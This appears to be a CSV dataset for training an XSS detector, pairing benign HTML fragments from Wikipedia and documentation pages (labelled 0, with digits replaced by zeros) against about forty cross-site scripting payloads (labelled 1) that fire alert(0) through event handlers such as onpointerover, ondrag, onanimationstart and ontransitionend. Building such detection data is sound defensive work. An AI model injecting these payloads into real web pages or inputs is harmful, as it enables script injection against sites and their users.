Payload,Label
"</p><p>concern over risk from artificial intelligence has led to some high-profile donations and investments. a group of prominent tech titans including <a href=""/wiki/peter_thiel"" title=""peter thiel"">peter thiel </a>, amazon web services and musk have committed $0 billion to <a href=""/wiki/openai"" title=""openai"">openai </a>, a nonprofit company aimed at championing responsible ai development.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup> the opinion of experts within the field of artificial intelligence is mixed, with sizable fractions both concerned and unconcerned by risk from eventual superhumanly-capable ai.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup> other technology industry leaders believe that artificial intelligence is helpful in its current form and will continue to assist humans. oracle ceo <a href=""/wiki/mark_hurd"" title=""mark hurd"">mark hurd </a> has stated that ai ""will actually create more jobs, not less jobs"" as humans will be needed to manage ai systems.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup> facebook ceo <a href=""/wiki/mark_zuckerberg"" title=""mark zuckerberg"">mark zuckerberg </a> believes ai will ""unlock a huge amount of positive things,"" such as curing disease and increasing the safety of autonomous cars.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup> in january 0, musk donated $0 million to the <a href=""/wiki/future_of_life_institute"" title=""future of life institute"">future of life institute </a> to fund research on understanding ai decision making. the goal of the institute is to ""grow wisdom with which we manage"" the growing power of technology. musk also funds companies developing artificial intelligence such as <a href=""/wiki/deepmind"" title=""deepmind"">deepmind </a> and <a href=""/wiki/vicarious_(company)"" title=""vicarious (company)"">vicarious </a> to ""just keep an eye on what's going on with artificial intelligence.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup> i think there is potentially a dangerous outcome there.""<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup><sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup>",0
"<div draggable=""true"" contenteditable>drag me</div><cite ondrop=alert(0) contenteditable>drop here</cite>",1
<head onpointerover=alert(0)>xss</head>,1
"</span> <small class=""date-container""><i>(<span class=""date"">january 0",0
"<table onkeyup=""alert(0)"" contenteditable>test</table>",1
"<li><a href=""/wiki/enterprise_information_system"" title=""enterprise information system"">enterprise information system </a> </li>",0
"<multicol onmouseup=""alert(0)"">test</multicol>",1
"<html oncontextmenu=""alert(0)"">test</html>",1
"<style>@keyframes x{}</style><footer style=""animation-name:x"" onanimationstart=""alert(0)""></footer>",1
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onanimationstart=""alert(0)""></caption>",1
"<mark draggable=""true"" ondrag=""alert(0)"">test</mark>",1
</span>(0) </li>,0
<em onpointermove=alert(0)>xss</em>,1
</li>,0
"<li><a href=""/wiki/phase-change_memory"" title=""phase-change memory"">pram </a> </li>",0
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationstart=""alert(0)""></slot>",1
"<div class=""toctree-wrapper compound"">",0
"<nextid oncontextmenu=""alert(0)"">test</nextid>",1
"<button onkeydown=""alert(0)"" contenteditable>test</button>",1
"<sub draggable=""true"" ondragenter=""alert(0)"">test</sub>",1
"</span> <span class=""reference-text"">",0
<animatetransform onpointerenter=alert(0)>xss</animatetransform>,1
"<h0 onmousedown=""alert(0)"">test</h0>",1
"<h0 draggable=""true"" ondragend=""alert(0)"">test</h0>",1
<rtc id=x tabindex=0 onfocus=alert(0)></rtc>,1
<div>,0
"<li class=""toctree-l0""><a class=""reference internal"" href=""topics/commands.html"">command line tool</a></li>",0
,0
"<li><a href=""/wiki/digital_marketing"" title=""digital marketing"">digital marketing </a> </li>",0
<meter onpointerdown=alert(0)>xss</meter>,1
"<div style=""padding:0em 0.0em"">",0
<br onpointerover=alert(0)>xss</br>,1
<li onpointerleave=alert(0)>xss</li>,1
,0
"<li id=""cite_note-artsy-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-artsy_0-0"">^ </a> </b>",0
"<style>:target {color:red;}</style><code id=x style=""transition:color 0s"" ontransitionend=alert(0)></code>",1
"</span> <span class=""reference-text"">anderson, susan leigh. ""asimov's ""three laws of robotics"" and machine metaethics."" ai & society 0.0 (0): 0–0.",0
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<var draggable=""true"" ondrag=""alert(0)"">test</var>",1
"</span> <span class=""toctext"">existential risk",0
"<datalist draggable=""true"" ondragend=""alert(0)"">test</datalist>",1
<details id=x tabindex=0 ondeactivate=alert(0)></details><input id=y autofocus>,1
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=unknown&rft.jtitle=fast+company&rft.atitle=elon+musk+is+donating+$0m+of+his+own+money+to+artificial+intelligence+research&rft.date=0-0-0&rft_id=http://u class=""z0"">",0
</span> </a> </li>,0
"<style onbeforepaste=""alert(0)"" contenteditable>test</style>",1
"<meter onbeforepaste=""alert(0)"" contenteditable>test</meter>",1
<span onpointerdown=alert(0)>xss</span>,1
"<thead onmouseenter=""alert(0)"">test</thead>",1
"<a href=""/wiki/artificial_brain"" title=""artificial brain"">artificial brain </a> arguments: ai requires a simulation of the operation of the human brain",0
<animatemotion onpointerdown=alert(0)>xss</animatemotion>,1
</span>,0
</li>,0
"<li><a href=""/wiki/computationalism"" class=""mw-redirect"" title=""computationalism"">computationalism </a> </li>",0
"<li><cite id=""citerefrussellnorvig0"" class=""citation""><a href=""/wiki/stuart_j._russell"" title=""stuart j. russell"">russell, stuart j. </a>; <a href=""/wiki/peter_norvig"" title=""peter norvig"">norvig, peter </a> (0), <a rel=""nofollow"" class=""external text"" href=""http://u intelligence: a modern approach </i> </a> (0nd ed.), upper saddle river, new jersey: prentice hall, <a href=""/wiki/international_standard_book_number"" title=""international standard book number"">isbn </a> <a href=""/wiki/special:booksources/0-0-0-0"" title=""special:booksources/0-0-0-0""><bdi>0-0-0-0 </bdi> </a> </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:book&rft.genre=book&rft.btitle=artificial+intelligence:+a+modern+approach&rft.place=upper+saddle+river,+new+jersey&rft.edition=0nd&rft.pub=prentice+hall&rft.date=0&rft.isbn=0-0-0-0&rft.aulast=russell&rft.aufirst=stuart+j.&rft.au=norvig,+peter&rft_id=http://u class=""z0"">",0
"<style>:target {color: red;}</style><xmp id=x style=""transition:color 0s"" ontransitioncancel=alert(0)></xmp>",1
"<li id=""cite_note-footnotedomingos0-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnotedomingos0_0-0"">^ </a> </b>",0
"<dt><a class=""reference internal"" href=""topics/item-pipeline.html""><span class=""doc"">item pipeline",0
"<div role=""note"" class=""hatnote navigation-not-searchable"">main article: <a href=""/wiki/robotics"" title=""robotics"">robotics </a> </div>",0
"<script onbeforecopy=""alert(0)"" contenteditable>test</script>",1
"<area draggable=""true"" ondrag=""alert(0)"">test</area>",1
<th id=x tabindex=0 onfocusin=alert(0)></th>,1
</div>,0
<source onpointerdown=alert(0)>xss</source>,1
